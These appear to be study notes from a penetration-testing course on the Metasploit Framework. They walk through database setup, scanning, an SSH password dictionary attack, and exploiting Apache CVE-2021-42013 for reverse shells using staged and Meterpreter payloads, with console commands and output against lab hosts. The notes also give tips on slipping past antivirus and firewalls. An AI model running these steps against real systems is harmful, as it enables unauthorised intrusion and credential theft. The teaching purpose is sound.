# The Metasploit Framework
As we have worked through previous Modules, it should be clear that locating, working with, and fixing public exploits is difficult
+ They must be modified to fit each scenario and tested for malicious code
+ Each uses a unique command-line syntax and there is no standardization in coding practices or languages

In addition, even in the most basic attack scenarios, there is a variety of post-exploitation tools, auxiliary tools, and attack techniques to consider

Exploit frameworks aim to address some or all of these issues
+ Although they vary somewhat in form and function, each aims to consolidate and streamline the process of exploitation by offering a variety of exploits, simplifying the usage of these exploits, easing lateral movement, and assisting with the management of compromised infrastructure
+ Most of these frameworks offer dynamic payload capabilities
+ This means that for each exploit in the framework, we can choose various payloads to deploy

Over the past few years, several exploit and post-exploitation frameworks have been developed, including _Metasploit_, _Covenant_, _Cobalt Strike_, and _PowerShell Empire_, each offering some or all of these capabilities
+ While frameworks such as Cobalt Strike are commercial offerings, the Metasploit Framework (MSF, or simply _Metasploit_) is open-source, frequently updated, and the focus of this Module

The Metasploit Framework, maintained by _Rapid7_, is described by its authors as "an advanced platform for developing, testing, and using exploit code"
+ The project initially started off as a portable network game and has evolved into a powerful tool for penetration testing, exploit development, and vulnerability research
+ The Framework has slowly but surely become the leading free exploit collection and development framework for security auditors
+ Metasploit is frequently updated with new exploits and is constantly being improved and further developed by Rapid7 and the security community

Kali Linux includes the _metasploit-framework_ package, which contains the open source elements of the Metasploit project
+ Newcomers to Metasploit are often overwhelmed by the multitude of features and different use-cases for the tool as it includes components for information gathering, vulnerability research and development, client-side attacks, post-exploitation, and much more

With such overwhelming capabilities, it's easy to get lost within Metasploit. Fortunately, the framework is well thought out and offers a unified and sensible interface
+ In this Module, we will provide a walkthrough of the Metasploit Framework, including features and usage along with some explanation of its inner workings
+ While we cover Metasploit in particular, we'll discuss various concepts which are true for other exploit frameworks as well
+ The main goal of this Module is to understand how these frameworks can assist us in a real penetration test

## Getting Familiar with Metasploit
In this Learning Unit, we will get familiar with the Metasploit Framework (MSF)
+ We'll start with setting up the environment and navigating through the framework
+ Then, we'll get familiar with two types of _modules_
	+ In Metasploit, modules are the primary way of interacting with the framework and are used to perform tasks such as scanning or exploiting a target
	+ First, we'll explore Metasploit's auxiliary modules and how we can use them for tasks such as protocol enumeration and port scanning
	+ Finally, we'll review exploit modules contained in Metasploit

### Setup and Work with MSF
Although the Metasploit Framework comes preinstalled on Kali Linux, it's not starting a database service in its default configuration
+ While using a database is not mandatory to run Metasploit, there are various compelling reasons to do so, such as storing information about target hosts and keeping track of successful exploitation attempts
+ Metasploit uses _PostgreSQL_ as a database service, which is neither active nor enabled on boot time on Kali

We can start the database service as well as create and initialize the MSF database with **`msfdb init`**:
```
sudo msfdb init
```

To enable the database service at boot time we can use **systemctl**:
```
sudo systemctl enable postgresql
```

Now, let's launch the Metasploit command-line interface with **msfconsole**
```
sudo msfconsole
```
+ To hide the banner and version information while starting up, we can add the **-q** option to the msfconsole command

Once the Metasploit command-line interface is started, we can verify database connectivity with **`db_status`**:
```
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
```
+ Above shows that the database is connected and we are all set up

The command-line interface of Metasploit provides numerous commands to navigate and use the framework, divided into categories, These categories consist of:
+ _Core Commands_
+ _Module Commands_
+ _Job Commands_
+ _Resource Script Commands_
+ _Database Backend Commands_
+ _Credentials Backend Commands_
+ _Developer Commands_

We can get a list of all available commands by entering **help**
```
help
```

Before we jump into performing operations within Metasploit, let's discuss one important concept first: _workspaces_
+ Let's assume we have performed a penetration test and Metasploit stored all information about our target and its infrastructure in the database
+ When we start the next penetration test, this information still exists in the database
+ To address this and avoid mixing each assessment's results with results from different assessments, we can use workspaces

The Metasploit **workspace** command lists all previously-created workspaces
+ We can switch to a workspace by adding the name to the command
+ To create a new workspace, we have to provide the workspace name as argument to **-a**
+ Usage: 
```
workspace -a <NAME>
```
+ Example:
```
msf6 > workspace
* default

msf6 > workspace -a pen200
[*] Added workspace: pen200
[*] Workspace: pen200
```

Now, let's populate the database and get familiar with some of the _Database Backend Commands_
+ For this, we'll scan BRUTE2 with **db_nmap** which is a wrapper to execute Nmap inside Metasploit and save the findings in the database
+ The command has identical syntax to Nmap: `db_nmap`
+ Example:
```
msf6 > db_nmap
[*] Usage: db_nmap [--save | [--help | -h]] [nmap options]

msf6 > db_nmap -A 192.168.50.202
[*] Nmap: Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-28 03:48 EDT
[*] Nmap: Nmap scan report for 192.168.50.202
[*] Nmap: Host is up (0.11s latency).
[*] Nmap: Not shown: 993 closed tcp ports (reset)
[*] Nmap: PORT     STATE SERVICE       VERSION
[*] Nmap: 21/tcp   open  ftp?
...
[*] Nmap: 135/tcp  open  msrpc         Microsoft Windows RPC
[*] Nmap: 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp  open  microsoft-ds?
[*] Nmap: 3389/tcp open  ms-wbt-server Microsoft Terminal Services
...
[*] Nmap: 5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
...
[*] Nmap: 8000/tcp open  http          Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
...
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 67.72 seconds
```
+ Above shows the results of the port scan performed with Nmap
+ As stated before, if the database service is running, Metasploit will log findings and information about discovered hosts, services, or credentials in a convenient, accessible database

To get a list of all discovered hosts up to this point, we can enter **`hosts`**:
```
hosts
```
+ Example:
```
msf6 > hosts

Hosts
=====

address         mac  name  os_name       os_flavor  os_sp  purpose  info  comments
-------         ---  ----  -------       ---------  -----  -------  ----  --------
192.168.50.202             Windows 2016                    server
```

In addition, we can enter **`services`** to display the discovered services from our port scan
+ We can also filter for a specific port number by providing it as argument for **`-p`**
+ Example:
```
msf6 > services
Services
========

host            port  proto  name           state  info
----            ----  -----  ----           -----  ----
192.168.50.202  21    tcp    ftp            open
192.168.50.202  135   tcp    msrpc          open   Microsoft Windows RPC
192.168.50.202  139   tcp    netbios-ssn    open   Microsoft Windows netbios-ssn
192.168.50.202  445   tcp    microsoft-ds   open
192.168.50.202  3389  tcp    ms-wbt-server  open   Microsoft Terminal Services
192.168.50.202  5357  tcp    http           open   Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
192.168.50.202  8000  tcp    http           open   Golang net/http server Go-IPFS json-rpc or InfluxDB API

msf6 > services -p 8000
Services
========

host            port  proto  name  state  info
----            ----  -----  ----  -----  ----
192.168.50.202  8000  tcp    http  open   Golang net/http server Go-IPFS json-rpc or InfluxDB API
```
+ Above shows all discovered services up to this point
+ As we can filter for specific port numbers, we can quickly identify all hosts with a specific service running

When working on an assessment with numerous target systems, the Database Backend Commands are invaluable in identifying important information and discovering potential attack vectors
+ We can also use the results stored in the database as input to modules, which we'll discuss in the next section

Before we head into the next section, let's briefly review modules again
+ As stated, modules are used to perform tasks in Metasploit such as scanning or exploiting a target
+ The framework includes several thousand modules, divided into categories

The categories are displayed on the splash screen summary, but we can also view them with the **`show -h`** command
+ To activate a module, we need to enter **use** with the module name
+ The modules all follow a common slash-delimited hierarchical syntax (_module type/os, vendor, app, operation, or protocol/module name_), which makes it easy to explore and use the modules
+ We'll begin by exploring auxiliary modules in the next section and then dive into exploit modules

### Auxiliary Modules 
The Metasploit Framework includes hundreds of auxiliary modules that provide functionality such as protocol enumeration, port scanning, fuzzing, sniffing, and more
+ Auxiliary modules are useful for many tasks, including information gathering (under the _gather/_ hierarchy), scanning and enumeration of various services (under the _scanner/_ hierarchy), and so on

There are too many to cover here, but we will demonstrate the syntax and operation of two very common auxiliary modules
+ To list all auxiliary modules, we can run the **show auxiliary** command
+ This will present a very long list of all auxiliary modules, usage:
```
show auxiliary
```

We can use **search** to reduce this considerable output, filtering by app, type, CVE ID, operation, platform, and more
+ For this first example, we want to obtain the SMB version of the previously scanned system BRUTE2 by using a Metasploit auxiliary module
+ To find the correct module, we can search for all SMB auxiliary modules by entering:
```
search type:auxiliary smb
```

As stated before, to activate a module we can enter **use** followed by the module name, or use the index provided from search results
+ Let's use the latter to activate the module _auxiliary/scanner/smb/smb_version_ with index 56:
```
msf6 > use 56
msf6 auxiliary(scanner/smb/smb_version) >
```
+ Above shows we have activated the _smb_version_ module as indicated in the command-line prompt

To get information about the currently activated module, we can enter **`info`**
+ Example:
```
msf6 auxiliary(scanner/smb/smb_version) > info

       Name: SMB Version Detection
     Module: auxiliary/scanner/smb/smb_version
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  hdm <x@hdm.io>
  Spencer McIntyre
  Christophe De La Fuente

Check supported:
  No

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  RHOSTS                    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
  THREADS  1                yes       The number of concurrent threads (max one per host)

Description:
  Fingerprint and display version information about SMB servers. 
  Protocol information and host operating system (if available) will 
  be reported. Host operating system detection requires the remote 
  server to support version 1 of the SMB protocol. Compression and 
  encryption capability negotiation is only present in version 3.1.1.
```
+ The module description provides information about the purpose of the module

The output also contains the _Basic options_, which are the arguments for the module. We can also display the options of a module by entering **`show options`**
+ The options contain a column named _Required_, which specifies if a value needs to be set before the module can be launched
+ We should note that in most modules, Metasploit will already set some of the options for us:
```
msf6 auxiliary(scanner/smb/smb_version) > show options

Module options (auxiliary/scanner/smb/smb_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s)...
   THREADS  1                yes       The number of concurrent threads (max one per host)
```
+ Above shows the option _RHOSTS_ has no value set but is required by the module
+ To display all required, but not yet set, options we can use the command **`show missing`**

We can add or remove values from options with **set** and **unset**
+ Let's **set** the value for the option _RHOSTS_ to the IP of BRUTE2:
```
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.50.202
RHOSTS => 192.168.50.202
```

Instead of setting the value manually, we can also set the value of _RHOSTS_ in an automated fashion by leveraging the results in the database
+ For example, we can set _RHOSTS_ to all discovered hosts with open port 445 by entering **services**, the port number as argument to **-p**, and **--rhosts** to set the results for this option
+ Before we do this, we'll **unset** the current value we manually set
```

msf6 auxiliary(scanner/smb/smb_version) > unset RHOSTS
Unsetting RHOSTS...

msf6 auxiliary(scanner/smb/smb_version) > services -p 445 --rhosts
Services
========

host            port  proto  name          state  info
----            ----  -----  ----          -----  ----
192.168.50.202  445   tcp    microsoft-ds  open

RHOSTS => 192.168.50.202
```
+ Above shows that Metasploit set the value for the option _RHOSTS_ based on the stored results in the database, which, in our case, is the IP of BRUTE2

Now, that we have set all required options, we can launch the module
+ Let's do this by entering **`run`**
```
msf6 auxiliary(scanner/smb/smb_version) > run

[*] 192.168.50.202:445    - SMB Detected (versions:2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:LZNT1, Pattern_V1) (encryption capabilities:AES-256-GCM) (signatures:optional) (guid:{e09176d2-9a06-427d-9b70-f08719643f4d}) (authentication domain:BRUTE2)
[*] 192.168.50.202:       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
+ We just executed our first module
+ The output shows that the target system supports version 2 and 3 of SMB and prefers SMB 3.1.1

Next, let's use the **`vulns`** command to show if Metasploit automatically detected vulnerabilities based on the results of this module
```
msf6 auxiliary(scanner/smb/smb_version) > vulns

Vulnerabilities
===============

Timestamp                Host            Name                         References
---------                ----            ----                         ----------
2022-07-28 10:17:41 UTC  192.168.50.202  SMB Signing Is Not Required  URL-https://support.microsoft.com/en-us/help/161372/how-to-enable-smb-signing-in-windows-nt,URL-https://support.microsoft.com/en-us/help/88
                                                                      7429/overview-of-server-message-block-signing
```
+ Above shows that our database contains one vulnerability entry about _SMB Signing is not required_ and further information about it
+ This is a great way of quickly identifying vulnerabilities without the use of vulnerability scanners

Next, let's use another module. In the _Password Attacks_ Module, we successfully identified credentials on BRUTE by leveraging a dictionary attack against SSH. Instead of Hydra, we can also use Metasploit to perform this attack
+ To begin, we'll **search** for SSH auxiliary modules:
```
search type:auxiliary ssh
```
+ The output lists an auxiliary module named _auxiliary/scanner/ssh/ssh_login_ with a fitting description
+ can activate it by using the index 15
+ Once the module is activated, we can display its options:
```
msf6 auxiliary(scanner/smb/smb_version) > use 15

msf6 auxiliary(scanner/ssh/ssh_login) > show options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
...
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           false            yes       Whether to print output for all attempts
```

There are various options to set in this module
+ Fortunately, Metasploit already set several for us
+ As with Hydra's options, we can set a single password and user, or provide files containing users, passwords, or both

As in the example in _Password Attacks_, we assume we already identified the username _george_
+ We can specify **rockyou.txt** for the option **PASS_FILE**
+ Finally, we set **RHOSTS** to **192.168.50.201** and **RPORT** to **2222**:
```
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
PASS_FILE => /usr/share/wordlists/rockyou.txt

msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME george
USERNAME => george

msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.50.201
RHOSTS => 192.168.50.201

msf6 auxiliary(scanner/ssh/ssh_login) > set RPORT 2222
RPORT => 2222
```

Now, all required options are set and we can launch the module with **run**:
```
msf6 auxiliary(scanner/ssh/ssh_login) > run

[*] 192.168.50.201:2222 - Starting bruteforce
[+] 192.168.50.201:2222 - Success: 'george:chocolate' 'uid=1001(george) gid=1001(george) groups=1001(george) Linux brute 5.15.0-37-generic #39-Ubuntu SMP Wed Jun 1 19:16:45 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux '
[*] SSH session 1 opened (192.168.119.2:38329 -> 192.168.50.201:2222) at 2022-07-28 07:22:05 -0400
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
+ By performing a dictionary attack with the activated auxiliary module, Metasploit could determine the correct password as shown above

Unlike Hydra, Metasploit not only displays the valid credentials, but also opens a _session_
+ We'll explore what sessions are and how we can use them in the following Learning Unit, but for now, we should understand that Metasploit already provides us with interactive access to the target automatically

As with the vulnerability displayed by the vulns command, we can display all valid credentials we gathered up to this point by entering **`creds`**:
```
msf6 auxiliary(scanner/ssh/ssh_login) > creds
Credentials
===========

host            origin          service       public  private    realm  private_type  JtR Format
----            ------          -------       ------  -------    -----  ------------  ----------
192.168.50.201  192.168.50.201  2222/tcp (ssh)  george  chocolate         Password  
```
+ Metasploit stores the valid credentials automatically for us in the database
+ It also shows us the related host, the service, and the type of credential

**Note**: Can delete database with `sudo msfdb delete`

### Exploit Modules 
Now that we are acquainted with basic MSF usage and the usage of auxiliary modules, let's dig deeper into the business end of MSF: **exploit modules**

Exploit modules most commonly contain exploit code for vulnerable applications and services
+ Metasploit contains over 2200 exploits at the time of this writing
+ Each was meticulously developed and tested, making MSF capable of successfully exploiting a wide variety of vulnerable services
+ These exploits are invoked in much the same way as auxiliary modules

In this example, we'll leverage one of the exploit modules to get access to the target system WEB18
+ Let's assume we identified that the system runs an Apache 2.4.49 web server and is vulnerable to _CVE-2021-42013_ with a vulnerability scan
+ We'll attempt to use Metasploit and its exploit modules to exploit this vulnerability and get code execution

Let's create a new workspace for this section and search Metasploit for modules related to "Apache 2.4.49":
```
msf6 auxiliary(scanner/ssh/ssh_login) > workspace -a exploits
[*] Added workspace: exploit
[*] Workspace: exploit

msf6 auxiliary(scanner/ssh/ssh_login) > search Apache 2.4.49

Matching Modules
================

   #  Name                                          Disclosure Date  Rank       Check  Description
   -  ----                                          ---------------  ----       -----  -----------
   0  exploit/multi/http/apache_normalize_path_rce  2021-05-10       excellent  Yes    Apache 2.4.49/2.4.50 Traversal RCE
   1  auxiliary/scanner/http/apache_normalize_path  2021-05-10       normal     No     Apache 2.4.49/2.4.50 Traversal RCE scanner
```
+ Above shows that our search resulted in two matching modules
+ Index 1 refers to an auxiliary module that checks if one or more target systems are vulnerable to the previously mentioned vulnerability
+ Index 0 refers to the corresponding exploit module

Let's **`use`** the exploit module and enter **`info`** to review its description:
```
msf6 auxiliary(scanner/ssh/ssh_login) > use 0
[*] Using configured payload linux/x64/meterpreter/reverse_tcp

msf6 exploit(multi/http/apache_normalize_path_rce) > info

       Name: Apache 2.4.49/2.4.50 Traversal RCE
     Module: exploit/multi/http/apache_normalize_path_rce
   Platform: Unix, Linux
       Arch: cmd, x64, x86
...
Module side effects:
 ioc-in-logs
 artifacts-on-disk

Module stability:
 crash-safe

Module reliability:
 repeatable-session

Available targets:
  Id  Name
  --  ----
  0   Automatic (Dropper)
  1   Unix Command (In-Memory)

Check supported:
  Yes
...

Description:
  This module exploit an unauthenticated RCE vulnerability which 
  exists in Apache version 2.4.49 (CVE-2021-41773). If files outside 
  of the document root are not protected by ‘require all denied’ 
  and CGI has been explicitly enabled, it can be used to execute 
  arbitrary commands (Remote Command Execution). This vulnerability 
  has been reintroduced in Apache 2.4.50 fix (CVE-2021-42013).
...
```

The output contains several important pieces of information in the context of this exploit module
+ Before we blindly set our target and run an exploit module, we should always understand what the module is doing by reviewing the module's information
+ The output starts with general information about the exploit such as the name, platform, and architecture

The output also contains information about potential side effects of running this exploit module, such as _Indicators of compromise_ entries in log solutions, and, in this example, artifacts on disk
+ This and the _module stability_ help us predict if we may crash a target system or what information defenders may obtain from us using this exploit module

The _module reliability_ determines if we can run the exploit more than once
+ In our example, the output states _repeatable-session_
+ This is important as some exploit modules will only work once

The _Targets available_ area of the output commonly contains different target specifications of vulnerable targets by the exploit module
+ Often these targets range from different operating systems and application versions to command execution methods
+ Most modules provide the _Automatic_ target, which Metasploit tries to identify either by itself or by using the default operation specified by the module

_Check supported_ determines if we can use the _check_ command to dry-run the exploit module and confirm if a target is vulnerable before we actually attempt to exploit it 

_Description_ provides us a text-based explanation of the module's purpose
+ According to the output of this module's description, it seems to be the correct module for the vulnerability identified by the hypothetical vulnerability scan

Now that we have an understanding of what the exploit module does and what implications the execution of it has, we can display its options:
```
msf6 exploit(multi/http/apache_normalize_path_rce) > show options

Module options (exploit/multi/http/apache_normalize_path_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   CVE        CVE-2021-42013   yes       The vulnerability to use (Accepted: CVE-2021-41773, CVE-2021-42013)
   DEPTH      5                yes       Depth for Path Traversal
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      443              yes       The target port (TCP)
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /cgi-bin         yes       Base path
   VHOST                       no        HTTP server virtual host

Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

...
```
+ It is similar to the options available for the auxiliary modules from the previous section

However, for exploit modules, there is an additional option section named _Payload options_
+ If we don't set this, the module will select a default payload
+ The default payload may not be what we want or expect, so it's always better to set our options explicitly to maintain tight control of the exploitation process

We'll cover different payloads in the next Learning Unit, but for now we set it to a regular TCP reverse shell
+ We can select a payload with **set payload** and the payload name, in our case _payload/linux/x64/shell_reverse_tcp_
+ In addition, we enter the IP address of our Kali machine for **LHOST**:
```
msf6 exploit(multi/http/apache_normalize_path_rce) > set payload payload/linux/x64/shell_reverse_tcp
payload => linux/x64/shell_reverse_tcp

msf6 exploit(multi/http/apache_normalize_path_rce) > show options
...

Payload options (linux/x64/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.119.2    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

...
```
+ The output shows that the entered payload is now active for the exploit module
+ There are two options for this payload named _LHOST_ (the local host IP address or interface) and _LPORT_ (the local port), which are used for the reverse shell to connect to

By default, most exploit modules use the port 4444 in the _LPORT_ payload option
+ Depending on our machine's configuration, Metasploit may already set the _LHOST_ value for us
+ We should always double-check this value, especially if our machine contains multiple interfaces, because Metasploit may reference the wrong interface to set this value
+ **NOTE**: In real penetration tests we may face the situation that port 4444 is blocked by firewalls or other security technologies. This is quite common as it is the default port for Metasploit's modules. In situations like this, changing the port number to ports associated with more commonly used protocols such as HTTP or HTTPS may lead to a successful execution of the selected payload

We should note that we don't need to start a listener manually with tools such as _Netcat_ to receive the incoming reverse shell
+ Metasploit automatically sets up a listener matching the specified payload

Now, let's set the options _SSL_ to false and _RPORT_ to 80 since the target Apache web server runs on port 80 without HTTPS
+ Then, we set _RHOSTS_ to the target IP and enter **run**
```
msf6 exploit(multi/http/apache_normalize_path_rce) > set SSL false
SSL => false

msf6 exploit(multi/http/apache_normalize_path_rce) > set RPORT 80
RPORT => 80

msf6 exploit(multi/http/apache_normalize_path_rce) > set RHOSTS 192.168.50.16
RHOSTS => 192.168.50.16

msf6 exploit(multi/http/apache_normalize_path_rce) > run

[*] Started reverse TCP handler on 192.168.119.2:4444
[*] Started reverse TCP handler on 192.168.119.4:4444 
[*] Using auxiliary/scanner/http/apache_normalize_path as check
[+] http://192.168.50.16:80 - The target is vulnerable to CVE-2021-42013 (mod_cgi is enabled).
[*] Scanned 1 of 1 hosts (100% complete)
[*] http://192.168.50.16:80 - Attempt to exploit for CVE-2021-42013
[*] http://192.168.50.16:80 - Sending linux/x64/shell_reverse_tcp command payload
[*] Command shell session 2 opened (192.168.119.4:4444 -> 192.168.50.16:35534) at 2022-08-08 05:13:45 -0400
[!] This exploit may require manual cleanup of '/tmp/ruGC' on the target

id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

Once launched, the exploit module first starts a listener on port 4444 and uses the previously shown auxiliary module to check if the target is indeed vulnerable
+ Above shows that it is vulnerable 
+ Then, the vulnerability is exploited and the payload is sent
+ The console states that a session is opened, and we have obtained command execution

Before we head to the next section, let's explore the concept of _sessions_ and _jobs_ in Metasploit
+ Sessions are used to interact and manage access to successfully exploited targets, while jobs are used to run modules or features in the background

When we launched the exploit with **run**, a session was created and we obtained an interactive shell
+ We can send the session to the background by pressing Ctrl+z and confirming the prompt
+ Once the session is sent to the background, we can use **`sessions -l`** to list all active sessions:
```
Background session 2? [y/N]  y

msf6 exploit(multi/http/apache_normalize_path_rce) > sessions -l

Active sessions
===============

  Id  Name  Type             Information  Connection
  --  ----  ----             -----------  ----------
  ...
  2         shell x64/linux               192.168.119.4:4444 -> 192.168.50.16:35534 (192.168.50.16)
```

The output provides us information about the target and payload in use
+ This makes it easy for us to identify which session manages access to which target
+ We can interact with the session again by passing the session ID to **`sessions -i`**
```
msf6 exploit(multi/http/apache_normalize_path_rce) > sessions -i 2
[*] Starting interaction with 2...

uname -a
Linux c1dbace7bab7 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```
+ Above shows that we can again enter commands in the interactive shell
+ We can kill a session with **sessions -k** and the ID as argument

Instead of launching an exploit module and sending the resulting session to the background, we can use **`run -j`** to launch it in the context of a job
+ This way, we'll still find the output of launching the exploit module, but we'll need to interact with the resulting session before we can access it

Let's zoom out here for a moment and discuss why working with sessions and jobs is vital in a real penetration test
+ In an assessment, we'll face numerous targets and it is very easy to lose track of machines we already have access to
+ Using an exploit framework like Metasploit helps us manage access to these machines

If we want to execute commands on a specific system, we don't have to search through various terminals to find the correct Netcat listener, we can just interact with the specific session
+ We can launch exploit modules with **run -j** in the background and Metasploit will automatically create a session for us while we already work on the next target

In addition, Metasploit also stores information about targets, module results, and vulnerabilities in the database, which are invaluable for further steps in a penetration test and writing the report for the client

Using exploit modules in Metasploit is a straightforward process. As we learned in the Modules _Locating Public Exploits_ and _Fixing Exploits_, working with public exploits may require a lot of modification to get them working
+ This quite differs for exploit modules in Metasploit
+ Once we find the correct exploit module, understand the implications of it, and set the options, we can launch the exploit
+ Metasploit also sets up the correct listener to provide us interactive shell access, depending on the payload we set

The payload determines what happens on a system after a vulnerability is exploited
+ In the example of this section, we chose a common 64-bit Linux TCP reverse shell
+ However, Metasploit contains various other payloads
+ Depending on our needs, we have to understand what payload to set and how to configure it 
+ In the next Learning Unit, we'll explore the most important payload types offered by Metasploit

## Using Metasploit Payloads
In the previous Learning Unit, we leveraged _`linux/x64/shell_reverse_tcp`_ as a payload for an exploit module
+ Metasploit contains numerous other payloads targeting different operating systems and architectures
+ In addition, Metasploit contains many other payload types beyond basic shells performing different operations on the target
+ Furthermore, the framework is also capable of generating various file types containing payloads to perform certain operations, such as starting a reverse shell
+ In this Learning Unit, we'll discuss staged vs non-staged payloads, explore a special kind of payload named _Meterpreter_, and explore executable files containing payloads 

### Staged vs Non-Staged Payloads
In this section, we'll explore the differences between _staged_ and _non-staged_ payloads
+ Let's assume we've identified a buffer overflow vulnerability in a service. As we learned in _Fixing Exploits_, we need to be aware of the buffer size our shellcode will be stored in
+ If the shellcode size of our exploit exceeds the buffer size, our exploit attempt will fail
+ In a situation like this, it's vital which payload type we choose: staged or non-staged

The difference between these payload types is subtle but important
+ A _non-staged_ payload is sent in its entirety along with the exploit
+ This means the payload contains the exploit and full shellcode for a selected task
+ In general, these "all-in-one" payloads are more stable
+ The downside is that the size of these payloads will be bigger than other types

In contrast, a _staged_ payload is usually sent in two parts
+ The first part contains a small primary payload that causes the victim machine to connect back to the attacker, transfer a larger secondary payload containing the rest of the shellcode, and then execute it 

There are several situations in which we would prefer to use a staged payload instead of non-staged
+ If there are space-limitations in an exploit, a staged payload might be a better choice as it is typically smaller
+ In addition, we need to keep in mind that antivirus software can detect shellcode in an exploit
+ By replacing the full code with a first stage, which loads the second and malicious part of the shellcode, the remaining payload is retrieved and injected directly into the victim machine's memory
+ This may prevent detection and can increase our chances of success

Now that we have a basic understanding of these two types of payloads, let's get our hands dirty
+ For this, we'll use the same exploit module as in the previous section and enter **show payloads** to get a list of all payloads that are compatible with the currently selected exploit module
+ Usage:
```
show payloads
```
+ Example:
```
msf6 exploit(multi/http/apache_normalize_path_rce) > show payloads
Compatible Payloads
===================

   #   Name                                              Disclosure Date  Rank    Check  Description
   -   ----                                              ---------------  ----    -----  -----------
...
   15  payload/linux/x64/shell/reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Stager
...
   20  payload/linux/x64/shell_reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Inline
...
```
+ Above shows us the payload we used before at index 20
+ In Metasploit, the "/" character is used to denote whether a payload is staged or not, so _shell_reverse_tcp_ at index 20 is not staged, whereas _shell/reverse_tcp_ at index 15 is
+ Note: `/` = STAGED

Let's use the staged payload for this exploit module and launch it 
+ We should note that Metasploit will reuse the values for the options from the previous payload
```
msf6 exploit(multi/http/apache_normalize_path_rce) > set payload 15
payload => linux/x64/shell/reverse_tcp

msf6 exploit(multi/http/apache_normalize_path_rce) > run

[*] Started reverse TCP handler on 192.168.119.4:4444 
[*] Using auxiliary/scanner/http/apache_normalize_path as check
[+] http://192.168.50.16:80 - The target is vulnerable to CVE-2021-42013 (mod_cgi is enabled).
[*] Scanned 1 of 1 hosts (100% complete)
[*] http://192.168.50.16:80 - Attempt to exploit for CVE-2021-42013
[*] http://192.168.50.16:80 - Sending linux/x64/shell/reverse_tcp command payload
[*] Sending stage (38 bytes) to 192.168.50.16
[!] Tried to delete /tmp/EqDPZD, unknown result
[*] Command shell session 3 opened (192.168.119.4:4444 -> 192.168.50.16:35536) at 2022-08-08 05:18:36 -0400

id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```
+ Above shows that we successfully obtained a reverse shell by using the staged payload
+ The output states that the sent stage was only 38 bytes in size, making it a great choice when we attempt to exploit a vulnerability with space constraints

Obtaining a reverse shell with a staged payload concludes this section
+ We discussed the differences of staged and non-staged payloads and used a staged payload to launch an exploit module

In the examples so far, there have been only minor differences between staged and non-staged payloads since Metasploit did the heavy lifting for us in the background
+ In both situations, we were provided with a session on the target machine

### Meterpreter Payload
In the previous sections, we used a common TCP reverse shell
+ While we do have interactive access on a target system with this type of payload, we only have the functionality of a regular command shell
+ Exploit frameworks often contain more advanced payloads providing features and functionality such as file transfers, pivoting, and various other methods of interacting with the victim machine

Metasploit contains the _Meterpreter_ payload, which is a multi-function payload that can be dynamically extended at run-time
+ The payload resides entirely in memory on the target and its communication is encrypted by default
+ Meterpreter offers capabilities that are especially useful in the post-exploitation phase and exists for various operating systems such as Windows, Linux, macOS, Android, and more

Let's display all compatible payloads in the exploit module from the previous sections again and search for Meterpreter payloads
+ Once we find a non-staged 64-bit Meterpreter TCP reverse shell payload, we'll activate it and display its options:
```
msf6 exploit(multi/http/apache_normalize_path_rce) > show payloads

Compatible Payloads
===================

   #   Name                                              Disclosure Date  Rank    Check  Description
   -   ----                                              ---------------  ----    -----  -----------
   ...
   7   payload/linux/x64/meterpreter/bind_tcp                             normal  No     Linux Mettle x64, Bind TCP Stager
   8   payload/linux/x64/meterpreter/reverse_tcp                          normal  No     Linux Mettle x64, Reverse TCP Stager
   9   payload/linux/x64/meterpreter_reverse_http                         normal  No     Linux Meterpreter, Reverse HTTP Inline
   10  payload/linux/x64/meterpreter_reverse_https                        normal  No     Linux Meterpreter, Reverse HTTPS Inline
   11  payload/linux/x64/meterpreter_reverse_tcp                          normal  No     Linux Meterpreter, Reverse TCP Inline
   ...

